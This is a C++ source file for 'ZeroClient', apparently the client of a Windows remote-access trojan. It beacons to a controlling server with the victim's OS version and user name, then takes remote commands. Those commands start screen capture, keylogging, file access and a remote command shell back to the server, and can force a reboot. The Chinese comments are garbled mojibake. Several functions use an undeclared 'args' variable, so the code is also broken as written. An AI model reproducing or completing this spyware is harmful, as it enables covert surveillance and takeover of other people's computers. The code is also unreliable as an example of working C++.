#include "ZeroClient.h"

ZeroClient::ZeroClient()
{

}

void ZeroClient::connectTo(std::string domain, int port)
{
    // ���ӵ������
    if (!mSock.connectTo(domain, port)) {
        return;
    }

    // ���͵�������
    if (!sendLogin()) {
        return;
    }

    // ��ѭ�������ϴӷ���˽�������
    const int packetSize = 800;
    char szData[packetSize];
    int ret;

    while (1) {
        ret = mSock.recvData(szData, packetSize);

        // ���ִ���
        if (ret == SOCKET_ERROR || ret == 0) {
            // ��ջ�����
            mBuf.clear();
            break;
        }

        // �����ݼ��뵽������
        addDataToBuffer(szData, ret);
        std::cout << "data receive" << ret << std::endl;
    }
}

std::string ZeroClient::getUserName()
{
    char szUser[MAX_PATH];
    int size = MAX_PATH;
    GetUserNameA(szUser, (DWORD*)&size);
    return std::string(szUser);
}


// ���� RtlGetVersion ����ԭ��
typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOEXW);


std::string ZeroClient::getSystemModel()
{
    std::string version = "Unknown";

    // ��ȡ RtlGetVersion ����ָ��
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");

    if (RtlGetVersion) {
        // ��ȡ����ϵͳ�汾��Ϣ
        RTL_OSVERSIONINFOEXW osvi;
        ZeroMemory(&osvi, sizeof(osvi));
        osvi.dwOSVersionInfoSize = sizeof(osvi);

        NTSTATUS status = RtlGetVersion(&osvi);
        if (status == 0) { // ״̬�ɹ�
            // ��� Windows 11
            if (osvi.dwMajorVersion == 10 && osvi.dwMinorVersion == 0 && osvi.dwBuildNumber >= 22000) {
                version = "Windows11OrGreater";
   
            }
            // ��� Windows 10
            else if (osvi.dwMajorVersion == 10 && osvi.dwMinorVersion == 0) {
                version = "Windows10OrGreater";
                
            }
            // ��� Windows 8.1
            else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 3) {
                version = "Windows8Point1OrGreater";
               
            }
            // ��� Windows 8
            else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2) {
                version = "Windows8OrGreater";
              
            }
            // ��� Windows 7
            else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1) {
                version = "Windows7OrGreater";
               
            }
            // ��� Windows Vista
            else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0) {
                version = "VistaOrGreater";
               
            }
            // ��� Windows XP
            else if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1) {
                version = "XPOrGreater";
                
            }
        }
    }

    return version;

}


// GBK ת UTF-8
std::string GBKToUTF8(const std::string& gbkStr) {
    int unicodeLen = MultiByteToWideChar(CP_ACP, 0, gbkStr.c_str(), -1, NULL, 0);
    wchar_t* unicodeStr = new wchar_t[unicodeLen];
    MultiByteToWideChar(CP_ACP, 0, gbkStr.c_str(), -1, unicodeStr, unicodeLen);

    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, unicodeStr, -1, NULL, 0, NULL, NULL);
    char* utf8Str = new char[utf8Len];
    WideCharToMultiByte(CP_UTF8, 0, unicodeStr, -1, utf8Str, utf8Len, NULL, NULL);

    std::string result(utf8Str);
    delete[] unicodeStr;
    delete[] utf8Str;

    return result;
}


bool ZeroClient::sendLogin()
{
    // д�õ�����Ϣ��Ȼ���͸������
    std::string data;
    data.append(CmdLogin + CmdSplit);
    data.append("SYSTEM" + CmdSplit + getSystemModel() + CmdSplit);
    data.append("USER_NAME" + CmdSplit + getUserName());
    data.append(CmdEnd);

    std::string data_utf8=GBKToUTF8(data);

    mSock.sendData(data_utf8.data(), data_utf8.size());
    return true;
}

void ZeroClient::addDataToBuffer(char* data, int size)
{
    mBuf.append(data, size);

    // ������ת����ָ��ģʽ
    int endIndex;
    while ((endIndex = mBuf.find(CmdEnd)) >= 0) //�ҵ�/r/n�ͽ���ѭ��
    {
        std::string line = mBuf.substr(0, endIndex);
        mBuf.erase(0, endIndex + CmdEnd.length());

        // ��ȡָ��
        int firstSplit = line.find(CmdSplit);
        std::string cmd = line.substr(0, firstSplit);
        line.erase(0, firstSplit + CmdSplit.length());

        //����ָ��
        processCmd(cmd, line);
    }
}

void ZeroClient::processCmd(std::string& cmd, std::string& data)
{
    std::map<std::string, std::string> args = parseArgs(data);
    std::cout << cmd << " " << data << std::endl;

    // ��Ϣ������
    if (cmd == CmdSendMessage) {
        doSendMessage(args);
        return;
    }

    // ���¿�������
    if (cmd == CmdReboot) {
        doReboot(args);
        return;
    }

    // �˳�����������
    if (cmd == CmdQuit) {
        doQuit(args);
        return;
    }

    // ��Ļ�������
    if (cmd == CmdScreenSpy) {
        doScreenSpy(args);
        return;
    }

    // ���̼������
    if (cmd == CmdKeyboardSpy) {
        doKeyboardSpy(args);
        return;
    }

    // �ļ��������
    if (cmd == CmdFileSpy) {
        doFileSpy(args);
        return;
    }

    // �����п���
    if (cmd == CmdCmdSpy) {
        doCmdSpy(args);
        return;
    }
}

std::map<std::string, std::string> ZeroClient::parseArgs(std::string& data)
{
    // �ַ����ָ���б�
    std::vector<std::string> v;
    std::string::size_type pos1, pos2;
    pos2 = data.find(CmdSplit);
    pos1 = 0;
    while (std::string::npos != pos2)  //��pos2�Ҳ����Ӵ�
    {
        v.push_back(data.substr(pos1, pos2 - pos1));
        pos1 = pos2 + CmdSplit.size();
        pos2 = data.find(CmdSplit, pos1);
    }

    if (pos1 != data.length())   //�������ַ���ĩβ��������û�зָ��꣨��û�� CmdSplit������ʣ�ಿ��Ҳ���뵽 v �С�
        v.push_back(data.substr(pos1));


    
    for (int i = 0; i < (int)v.size() - 1; i += 2) {
        args[v.at(i)] = v.at(i + 1);
    }


    return args;
}

void ZeroClient::doScreenSpy(std::map<std::string, std::string>&)
{
    // ��ʼ�����Ļ
    ScreenSpy::startByNewThread(mSock.mIp, atoi(args["PORT"].data()));
}

void ZeroClient::doKeyboardSpy(std::map<std::string, std::string>&)
{
    KeyboardSpy::startKeyboardSpy(mSock.mIp, atoi(args["PORT"].data()));
}

void ZeroClient::doFileSpy(std::map<std::string, std::string>&)
{
    FileSpy::startFileSpy(mSock.mIp, atoi(args["PORT"].data()));
}

void ZeroClient::doCmdSpy(std::map<std::string, std::string>& args)
{
    CmdSpy::startCmdSpy(mSock.mIp, atoi(args["PORT"].data()));
}

void ZeroClient::doSendMessage(std::map<std::string, std::string>&args)
{
    // ����������Ϣ
    MessageBoxA(NULL, args["TEXT"].data(), "Message", MB_OK);
}

void ZeroClient::doReboot(std::map<std::string, std::string>&)
{
    // ��������
    system("shutdown -r -t 1");
}

void ZeroClient::doQuit(std::map<std::string, std::string>&)
{
    // �˳�������
    ExitProcess(NULL);
}

